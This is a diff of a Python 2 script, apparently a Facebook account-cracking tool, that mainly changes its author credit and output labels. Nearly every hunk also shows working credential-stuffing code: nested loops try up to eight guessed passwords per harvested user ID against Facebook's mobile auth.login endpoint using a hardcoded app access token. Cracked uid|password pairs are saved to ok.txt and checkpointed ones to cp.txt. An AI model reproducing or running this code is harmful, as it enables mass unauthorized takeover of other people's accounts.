@@ -1,9 +1,9 @@
 #!/usr/bin/python2
 # -*- coding: utf-8
 
-#AUTHOR : SOBAN SAMAR
+#AUTHOR : SOBAN BILAL
 #OPEN SOURCE :)
-#DON'T FORGET TO GIVE CREDIT TO SOBAN SAMAR
+#DON'T FORGET TO GIVE CREDIT TO SOBAN-BILAL
 
 P = "\033[97;1m" 
 M = "\033[91;1m" 
@@ -67,7 +67,7 @@ loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 
 def linex():
 	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
 def logo():
-	os.system('echo "\n  \nᕙSᕗᕙOᕗᕙBᕗᕙ𝑨ᕗᕙNᕗ\nE̺͆T̺͆H̺͆I̺͆C̺͆A̺͆L̺͆ H̺͆A̺͆C̺͆K̺͆E̺͆R̺͆\nꈼW̶↦ꈼE̶↦ꈼL̶↦ꈼC̶↦ꈼO̶↦ꈼM̶↦ꈼE\nN̺͆O̺͆T̺͆H̺͆I̺͆N̺͆G̺͆ S̺͆P̺͆E̺͆C̺͆I̺͆A̺͆L̺͆\n🅴NJ🅾Y\n \n┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┒\n┖┈┈┈┈┈S˟˚O˟˚B˟˚A˟˚N˟˚ S˟˚A˟˚M˟˚A˟˚R˟˚┈┈୨♡୧┈┈┈┚" | lolcat -a -d 2 -s 50')	
+	os.system('echo "\n  \nᕙSᕗᕙOᕗᕙBᕗᕙ𝑨ᕗᕙNᕗ\nE̺͆T̺͆H̺͆I̺͆C̺͆A̺͆L̺͆ H̺͆A̺͆C̺͆K̺͆E̺͆R̺͆\nꈼW̶↦ꈼE̶↦ꈼL̶↦ꈼC̶↦ꈼO̶↦ꈼM̶↦ꈼE\nN̺͆O̺͆T̺͆H̺͆I̺͆N̺͆G̺͆ S̺͆P̺͆E̺͆C̺͆I̺͆A̺͆L̺͆\n🅴NJ🅾Y\n \n┎┈┈┈┈┈┈┈┈┈┈୨♡୧┈┈┈┈┈┈┈┈┈┈┒\n┖┈┈┈┈┈S˟˚O˟˚B˟˚A˟˚N˟˚ B˟˚I˟˚L˟˚A˟˚L˟˚┈┈୨♡୧┈┈┈┚" | lolcat -a -d 2 -s 50')	
 
 def main():
 	os.system("clear")
@@ -296,7 +296,7 @@ def crack_select1():
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;97m [UBAID-CP] "+uid+" | "+pass1+"\033[1;93m")
+					print(" \033[1;97m [] "+uid+" | "+pass1+"\033[1;93m")
 					cp = open("cp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -306,14 +306,14 @@ def crack_select1():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q and "EAAA" in q:
-						print(" \033[1;32m [OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m [] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;97m [UBAID-CP] "+uid+" | "+pass2+"\033[1;93m")
+							print(" \033[1;97m [] "+uid+" | "+pass2+"\033[1;93m")
 							cp = open("cp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -323,14 +323,14 @@ def crack_select1():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q and "EAAA" in q:
-								print(" \033[1;32m [OK] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;32m [] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;97m [UBAID-CP] "+uid+" | "+pass3+"\033[1;93m")
+									print(" \033[1;97m [] "+uid+" | "+pass3+"\033[1;93m")
 									cp = open("cp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -340,14 +340,14 @@ def crack_select1():
 									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 									q = json.loads(data)
 									if "access_token" in q and "EAAA" in q:
-										print(" \033[1;32m [OK] "+uid+" | "+pass4+"\033[0;97m")
+										print(" \033[1;32m [] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
-											print(" \033[1;33m [UBAID-CP] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;33m [] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("cp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
@@ -357,14 +357,14 @@ def crack_select1():
 											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 											q = json.loads(data)
 											if "access_token" in q and "EAAA" in q:
-												print(" \033[1;32m [OK] "+uid+" | "+pass5+"\033[0;97m")
+												print(" \033[1;32m [] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
-													print(" \033[1;97m [UBAID-CP] "+uid+" | "+pass5+"\033[1;93m")
+													print(" \033[1;97m [] "+uid+" | "+pass5+"\033[1;93m")
 													cp = open("cp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
@@ -374,14 +374,14 @@ def crack_select1():
 													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 													q = json.loads(data)
 													if "access_token" in q and "EAAA" in q:
-														print(" \033[1;32m [OK] "+uid+" | "+pass6+"\033[0;97m")
+														print(" \033[1;32m [] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error_msg"]:
-															print(" \033[1;33m [UBAID-CP] "+uid+" | "+pass6+"\033[0;97m")
+															print(" \033[1;33m [] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("cp.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
 															cp.close()
@@ -391,14 +391,14 @@ def crack_select1():
 															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 															q = json.loads(data)
 															if "access_token" in q and "EAAA" in q:
-																print(" \033[1;32m [OK] "+uid+" | "+pass7+"\033[0;97m")
+																print(" \033[1;32m [] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt", "a")
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error_msg"]:
-																	print(" \033[1;33m [UBAID-CP] "+uid+" | "+pass7+"\033[0;97m")
+																	print(" \033[1;33m [] "+uid+" | "+pass7+"\033[0;97m")
 																	cp = open("cp.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
@@ -408,14 +408,14 @@ def crack_select1():
 																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 																	q = json.loads(data)
 																	if "access_token" in q and "EAAA" in q:
-																		print(" \033[1;32m [OK] "+uid+" | "+pass8+"\033[0;97m")
+																		print(" \033[1;32m [] "+uid+" | "+pass8+"\033[0;97m")
 																		ok = open("ok.txt", "a")
 																		ok.write(uid+"|"+pass8+"\n")
 																		ok.close()
 																		oks.append(uid+pass8)
 																	else:
 																		if "www.facebook.com" in q["error_msg"]:
-																			print(" \033[1;97m [UBAID-CP] "+uid+" | "+pass8+"\033[1;93m")
+																			print(" \033[1;97m [] "+uid+" | "+pass8+"\033[1;93m")
 																			cp = open("cp.txt", "a")
 																			cp.write(uid+"|"+pass8+"\n")
 																			cp.close()
@@ -494,7 +494,7 @@ def crack_select():
 			print('')
 			print("\t\033[93;1m  MANUAL PASS CRACKING")
 			print('')
-			print("\033[92;1m  COINING FROM : "+q["name"])
+			print("\033[92;1m  CLONING FROM : "+q["name"])
 		except KeyError:
 			print("\t\033[91;1m  INVALID LINK OR TOKEN")
 			print("")
@@ -534,7 +534,7 @@ def crack_select():
 			print('')
 			print("\t\033[93;1m  MANUAL PASS CRACKING")
 			print('')
-			print("\033[92;1m  COINING FROM : "+q["name"])
+			print("\033[92;1m  CLONING FROM : "+q["name"])
 		except KeyError:
 			print("\t\033[91;1m     INVALID LINK OR TOKEN")
 			print("")
@@ -600,14 +600,14 @@ def crack_select():
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 			q = json.loads(data)
 			if "access_token" in q and "EAAA" in q:
-				print(" \033[1;32m [OK] "+uid+" | "+pass1+"\033[0;97m")
+				print(" \033[1;32m [] "+uid+" | "+pass1+"\033[0;97m")
 				ok = open("ok.txt", "a")
 				ok.write(uid+"|"+pass1+"\n")
 				ok.close()
 				oks.append(uid+pass1)
 			else:
 				if "www.facebook.com" in q["error_msg"]:
-					print(" \033[1;97m [UBAID-CP] "+uid+" | "+pass1+"\033[1;93m")
+					print(" \033[1;97m [] "+uid+" | "+pass1+"\033[1;93m")
 					cp = open("cp.txt", "a")
 					cp.write(uid+"|"+pass1+"\n")
 					cp.close()
@@ -617,14 +617,14 @@ def crack_select():
 					data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass2+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 					q = json.loads(data)
 					if "access_token" in q and "EAAA" in q:
-						print(" \033[1;32m [OK] "+uid+" | "+pass2+"\033[0;97m")
+						print(" \033[1;32m [] "+uid+" | "+pass2+"\033[0;97m")
 						ok = open("ok.txt", "a")
 						ok.write(uid+"|"+pass2+"\n")
 						ok.close()
 						oks.append(uid+pass2)
 					else:
 						if "www.facebook.com" in q["error_msg"]:
-							print(" \033[1;33m [UBAID-CP] "+uid+" | "+pass2+"\033[0;97m")
+							print(" \033[1;33m [] "+uid+" | "+pass2+"\033[0;97m")
 							cp = open("cp.txt", "a")
 							cp.write(uid+"|"+pass2+"\n")
 							cp.close()
@@ -634,14 +634,14 @@ def crack_select():
 							data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass3+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 							q = json.loads(data)
 							if "access_token" in q and "EAAA" in q:
-								print(" \033[1;32m [OK] "+uid+" | "+pass3+"\033[0;97m")
+								print(" \033[1;32m [] "+uid+" | "+pass3+"\033[0;97m")
 								ok = open("ok.txt", "a")
 								ok.write(uid+"|"+pass3+"\n")
 								ok.close()
 								oks.append(uid+pass3)
 							else:
 								if "www.facebook.com" in q["error_msg"]:
-									print(" \033[1;97m [UBAID-CP] "+uid+" | "+pass3+"\033[1;93m")
+									print(" \033[1;97m [] "+uid+" | "+pass3+"\033[1;93m")
 									cp = open("cp.txt", "a")
 									cp.write(uid+"|"+pass3+"\n")
 									cp.close()
@@ -651,14 +651,14 @@ def crack_select():
 									data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass4+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 									q = json.loads(data)
 									if "access_token" in q and "EAAA" in q:
-										print(" \033[1;32m [OK] "+uid+" | "+pass4+"\033[0;97m")
+										print(" \033[1;32m [] "+uid+" | "+pass4+"\033[0;97m")
 										ok = open("ok.txt", "a")
 										ok.write(uid+"|"+pass4+"\n")
 										ok.close()
 										oks.append(uid+pass4)
 									else:
 										if "www.facebook.com" in q["error_msg"]:
-											print(" \033[1;33m [UBAID-CP] "+uid+" | "+pass4+"\033[0;97m")
+											print(" \033[1;33m [] "+uid+" | "+pass4+"\033[0;97m")
 											cp = open("cp.txt", "a")
 											cp.write(uid+"|"+pass4+"\n")
 											cp.close()
@@ -667,14 +667,14 @@ def crack_select():
 											data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass5+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 											q = json.loads(data)
 											if "access_token" in q and "EAAA" in q:
-												print(" \033[1;32m [OK] "+uid+" | "+pass5+"\033[0;97m")
+												print(" \033[1;32m [] "+uid+" | "+pass5+"\033[0;97m")
 												ok = open("ok.txt", "a")
 												ok.write(uid+"|"+pass5+"\n")
 												ok.close()
 												oks.append(uid+pass5)
 											else:
 												if "www.facebook.com" in q["error_msg"]:
-													print(" \033[1;97m [UBAID-CP] "+uid+" | "+pass5+"\033[1;93m")
+													print(" \033[1;97m [] "+uid+" | "+pass5+"\033[1;93m")
 													cp = open("cp.txt", "a")
 													cp.write(uid+"|"+pass5+"\n")
 													cp.close()
@@ -683,14 +683,14 @@ def crack_select():
 													data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass6+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 													q = json.loads(data)
 													if "access_token" in q and "EAAA" in q:
-														print(" \033[1;32m [OK] "+uid+" | "+pass6+"\033[0;97m")
+														print(" \033[1;32m [] "+uid+" | "+pass6+"\033[0;97m")
 														ok = open("ok.txt", "a")
 														ok.write(uid+"|"+pass6+"\n")
 														ok.close()
 														oks.append(uid+pass6)
 													else:
 														if "www.facebook.com" in q["error_msg"]:
-															print(" \033[1;33m [UBAID-CP] "+uid+" | "+pass6+"\033[0;97m")
+															print(" \033[1;33m [] "+uid+" | "+pass6+"\033[0;97m")
 															cp = open("cp.txt", "a")
 															cp.write(uid+"|"+pass6+"\n")
 															cp.close()
@@ -699,14 +699,14 @@ def crack_select():
 															data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass7+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 															q = json.loads(data)
 															if "access_token" in q and "EAAA" in q:
-																print(" \033[1;32m [OK] "+uid+" | "+pass7+"\033[0;97m")
+																print(" \033[1;32m [] "+uid+" | "+pass7+"\033[0;97m")
 																ok = open("ok.txt", "a")
 																ok.write(uid+"|"+pass7+"\n")
 																ok.close()
 																oks.append(uid+pass7)
 															else:
 																if "www.facebook.com" in q["error_msg"]:
-																	print(" \033[1;97m [UBAID-CP] "+uid+" | "+pass7+"\033[1;93m")
+																	print(" \033[1;97m [] "+uid+" | "+pass7+"\033[1;93m")
 																	cp = open("cp.txt", "a")
 																	cp.write(uid+"|"+pass7+"\n")
 																	cp.close()
@@ -716,14 +716,14 @@ def crack_select():
 																	data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass8+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
 																	q = json.loads(data)
 																	if "access_token" in q and "EAAA" in q:
-																		print(" \033[1;32m [OK] "+uid+" | "+pass8+"\033[0;97m")
+																		print(" \033[1;32m [] "+uid+" | "+pass8+"\033[0;97m")
 																		ok = open("ok.txt", "a")
 																		ok.write(uid+"|"+pass8+"\n")
 																		ok.close()
 																		oks.append(uid+pass8)
 																	else:
 																		if "www.facebook.com" in q["error_msg"]:
-																			print(" \033[1;97m [UBAID-CP] "+uid+" | "+pass8+"\033[1;93m")
+																			print(" \033[1;97m [] "+uid+" | "+pass8+"\033[1;93m")
 																			cp = open("cp.txt", "a")
 																			cp.write(uid+"|"+pass8+"\n")
 																			cp.close()
